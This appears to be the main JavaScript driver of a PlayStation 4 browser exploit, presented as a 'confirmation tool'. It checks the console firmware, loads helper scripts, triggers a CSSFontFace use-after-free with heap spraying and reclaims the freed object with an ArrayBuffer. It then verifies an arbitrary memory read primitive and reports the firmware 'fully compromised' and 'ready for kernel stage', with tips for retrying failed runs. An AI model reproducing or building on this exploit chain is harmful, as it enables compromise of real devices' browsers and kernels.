// main.js — CSSFontFace WebKit confirmation tool (memory-aware)

const TEST_NAMES = [
  { id: "fw",      label: "Firmware detection",         detail: "user-agent parse" },
  { id: "uaf",     label: "UAF trigger",                detail: "CSSFontFace freed" },
  { id: "reclaim", label: "Slot reclaim",               detail: "ArrayBuffer lands on freed slot" },
  { id: "wrapper", label: "UAF FontFace found",         detail: "unicodeRange check" },
  { id: "getter",  label: "featureSettings getter",     detail: "returns string" },
  { id: "mptr",    label: "m_wrapper is native pointer", detail: "heap address sanity" },
  { id: "read",    label: "Arbitrary read primitive",   detail: "dereference m_wrapper" },
];

const bannerEl     = document.getElementById("banner");
const bannerIcon   = bannerEl.querySelector(".icon");
const bannerTitle  = document.getElementById("banner-title");
const bannerDetail = document.getElementById("banner-detail");
const testsEl      = document.getElementById("tests");
const logEl        = document.getElementById("log");
const fwBadge      = document.getElementById("fw-badge");
const btnRun       = document.getElementById("btn-run");
const btnClear     = document.getElementById("btn-clear");

function log(msg) {
  logEl.textContent += msg + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() { logEl.textContent = ""; }

const testRows = {};
function initTestRows() {
  testsEl.innerHTML = "";
  for (const t of TEST_NAMES) {
    const row = document.createElement("div");
    row.className = "test";
    row.id = `test-${t.id}`;
    row.innerHTML =
      `<span class="dot"></span>` +
      `<span class="name">${t.label}</span>` +
      `<span class="detail">${t.detail}</span>`;
    testsEl.appendChild(row);
    testRows[t.id] = {
      el: row,
      detail: row.querySelector(".detail"),
      defaultDetail: t.detail,
    };
  }
}

function setTest(id, status, detail) {
  const r = testRows[id];
  if (!r) return;
  r.el.className = `test ${status}`;
  r.detail.textContent = detail || r.defaultDetail;
}

function setBanner(state, icon, title, detail) {
  bannerEl.className = `banner ${state}`;
  bannerIcon.textContent = icon;
  bannerTitle.textContent = title;
  bannerDetail.textContent = detail || "";
}

function detectFirmware() {
  const ua = navigator.userAgent;
  const m = ua.match(/PlayStation\s+4[/ ](\d+)\.(\d+)/i);
  if (!m) return { major: 0, minor: 0, str: "unknown" };
  return {
    major: parseInt(m[1], 10),
    minor: parseInt(m[2], 16),
    str: `${m[1]}.${m[2]}`,
  };
}

function loadScript(src) {
  return new Promise((resolve, reject) => {
    const s = document.createElement("script");
    s.src = src;
    s.onload = resolve;
    s.onerror = () => reject(new Error(`Failed to load ${src}`));
    document.head.appendChild(s);
  });
}

// Memory watchdog — logs usage before each stage
function memSnapshot(label) {
  if (!performance || !performance.memory) return;
  const m = performance.memory;
  const usedMB = (m.usedJSHeapSize / 1048576).toFixed(2);
  const totalMB = (m.totalJSHeapSize / 1048576).toFixed(2);
  const limitMB = (m.jsHeapSizeLimit / 1048576).toFixed(0);
  log(`[mem:${label}] used=${usedMB}MB total=${totalMB}MB cap=${limitMB}MB`);
}

async function runTest() {
  btnRun.disabled = true;
  initTestRows();
  clearLog();

  setBanner("pending working", "⋯", "Running", "initializing…");
  log("[test] CSSFontFace WebKit confirmation starting");
  memSnapshot("boot");

  let rw = null;

  try {
    setTest("fw", "pending", "");
    log("[stage] loading misc.js");
    await loadScript("src/misc.js");

    const fw = detectFirmware();
    fwBadge.textContent = `fw: ${fw.str}`;
    fwBadge.className = "badge " + (fw.str === "13.52" ? "ok" : "warn");

    if (fw.major === 0) {
      setTest("fw", "fail", "not a PS4 user-agent");
      throw new Error("Not running on PS4");
    }
    setTest("fw", "pass", `fw ${fw.str}`);
    log(`[fw] detected ${fw.str}`);

    version.init();
    if (version.console !== 4) {
      setTest("fw", "fail", `console ${version.console} unsupported`);
      throw new Error(`Unsupported console ${version.console}`);
    }

    log("[stage] loading constants.js + userland.js");
    await loadScript("src/ps4/constants.js");
    await loadScript("src/ps4/userland.js");

    memSnapshot("pre-uaf");

    // ── UAF ──
    setTest("uaf", "pending", "");
    setBanner("pending working", "⋯", "Running", "triggering UAF…");
    log("[stage] triggering CSSFontFace UAF");

    try {
      rw = await init_rw({ sprayCount: 0x10 });
    } catch (e) {
      const msg = e.message || String(e);

      // Classify the failure
      if (/not enough system memory|out of memory|OOM/i.test(msg)) {
        setTest("uaf", "fail", "browser OOM");
        log("");
        log("  ┌─────────────────────────────────────────────────┐");
        log("  │  PS4 BROWSER OUT OF MEMORY                      │");
        log("  │                                                 │");
        log("  │  The renderer hit its heap limit before the     │");
        log("  │  UAF could fire. Try these steps:               │");
        log("  │                                                 │");
        log("  │  1. Close ALL other tabs in the PS4 browser     │");
        log("  │  2. Reload this page fresh (do not reuse)       │");
        log("  │  3. Wait 5 seconds for the previous page's      │");
        log("  │     memory to be reclaimed by the system        │");
        log("  │  4. If it still fails, reduce sprayCount to     │");
        log("  │     0x08 in main.js runTest()                   │");
        log("  └─────────────────────────────────────────────────┘");
      } else if (/insertRule/i.test(msg)) {
        setTest("uaf", "fail", "CSS rule insert failed");
      } else if (/getter never fired/i.test(msg)) {
        setTest("uaf", "fail", "A did not resolve first");
      } else if (/reclaim|fonts.length/i.test(msg)) {
        setTest("uaf", "fail", "reclaim failed");
        setTest("reclaim", "fail", "no aliased ArrayBuffer");
      } else {
        setTest("uaf", "fail", msg.slice(0, 40));
      }
      throw e;
    }

    if (!rw || !rw.uaf_ab || !rw.uaf_font) {
      setTest("uaf", "fail", "no rw primitive returned");
      throw new Error("UAF / reclaim failed — no rw primitive");
    }
    setTest("uaf", "pass", "freed");
    log("[uaf] CSSFontFace freed");
    memSnapshot("post-uaf");

    // ── Reclaim ──
    setTest("reclaim", "pending", "");
    setBanner("pending working", "⋯", "Running", "verifying reclaim…");

    const abView = new DataView(rw.uaf_ab);
    const refCount = abView.getBInt(8, true);
    if (!refCount.eq(2)) {
      setTest("reclaim", "fail", `refcount=${refCount.toString()}`);
      throw new Error("ArrayBuffer refcount is not 2 — reclaim failed");
    }
    setTest("reclaim", "pass", "refcount=2");
    log("[reclaim] ArrayBuffer aliases freed CSSFontFace");

    // ── UAF FontFace ──
    setTest("wrapper", "pending", "");
    if (rw.uaf_font.unicodeRange !== "U+0-10FFFF") {
      setTest("wrapper", "fail", `unicodeRange=${rw.uaf_font.unicodeRange}`);
      throw new Error("UAF FontFace has wrong unicodeRange");
    }
    setTest("wrapper", "pass", "unicodeRange OK");
    log("[wrapper] UAF FontFace found");

    // ── Getter ──
    setTest("getter", "pending", "");
    setBanner("pending working", "⋯", "Running", "testing getter…");

    // Seed the getter buffer
    const legacyBufOff = constants.wk_CSSFontFace_m_featureSettings_m_buffer;
    abView.setBInt(legacyBufOff, 0x4141414141414141n, true);
    abView.setInt32(legacyBufOff + 8, 1, true);
    abView.setInt32(legacyBufOff + 12, 1, true);

    let getterOut = null;
    try {
      getterOut = rw.uaf_font.featureSettings;
    } catch (e) {
      setTest("getter", "fail", `threw: ${e.message.slice(0, 30)}`);
      throw new Error(`featureSettings threw: ${e.message}`);
    }

    if (!getterOut || typeof getterOut !== "string" || getterOut.length === 0) {
      setTest("getter", "fail", "returned empty");
      throw new Error("featureSettings getter returned nothing");
    }
    setTest("getter", "pass", `${getterOut.length} chars`);
    log(`[getter] returned ${JSON.stringify(getterOut.slice(0, 16))}…`);

    // ── m_wrapper sanity ──
    setTest("mptr", "pending", "");
    const m_wrapper = abView.getBInt(constants.wk_CSSFontFace_m_wrapper, true);

    const isNativePtr =
      m_wrapper.hi === 0xffff ||
      ((m_wrapper.hi & 0xffff0000) >>> 0) === 0xffff0000;

    if (!isNativePtr) {
      setTest("mptr", "fail", `m_wrapper=${m_wrapper.toString()}`);
      throw new Error("m_wrapper is not a native pointer");
    }
    setTest("mptr", "pass", m_wrapper.toString());
    log(`[mptr] m_wrapper = ${m_wrapper.toString()}`);

    // ── Read primitive ──
    setTest("read", "pending", "");
    setBanner("pending working", "⋯", "Running", "testing read primitive…");

    const bytes = rw.read(m_wrapper, 8);
    if (!bytes || bytes.byteLength !== 8) {
      setTest("read", "fail", "read returned no bytes");
      throw new Error("read() returned nothing");
    }

    const cell = new DataView(bytes).getBInt(0, true);
    log(`[read] JSCell = ${cell.toString()}`);

    if (cell.eq(0) || cell.eq(-1)) {
      setTest("read", "fail", `cell=${cell.toString()}`);
      throw new Error("read() returned a poison value");
    }

    setTest("read", "pass", `cell=${cell.toString()}`);
    log(`[read] arbitrary read primitive confirmed`);
    memSnapshot("post-read");

    // ── SUCCESS ──
    setBanner("pass", "✓", "WebKit Confirmed",
      `read primitive works — FW ${fw.str} fully compromised`);
    log("");
    log("════════════════════════════════════");
    log("  ✓ WebKit exploitation CONFIRMED");
    log("════════════════════════════════════");
    log("");
    log("  Ready for kernel stage.");

    // Cleanup after success
    if (rw.cleanup) rw.cleanup();

  } catch (e) {
    log("");
    log(`[FAIL] ${e.message}`);

    for (const t of TEST_NAMES) {
      const r = testRows[t.id];
      if (r && r.el.className.includes("pending")) {
        setTest(t.id, "fail", e.message.slice(0, 50));
        break;
      }
    }

    setBanner("fail", "✗", "WebKit Failed", e.message.slice(0, 80));

    if (rw && rw.cleanup) {
      try { rw.cleanup(); } catch (_) {}
    }
  } finally {
    btnRun.disabled = false;
  }
}

btnRun.addEventListener("click", runTest);
btnClear.addEventListener("click", () => {
  clearLog();
  initTestRows();
  setBanner("pending", "⋯", "Ready", "Click Run WebKit Test to begin");
});

initTestRows();
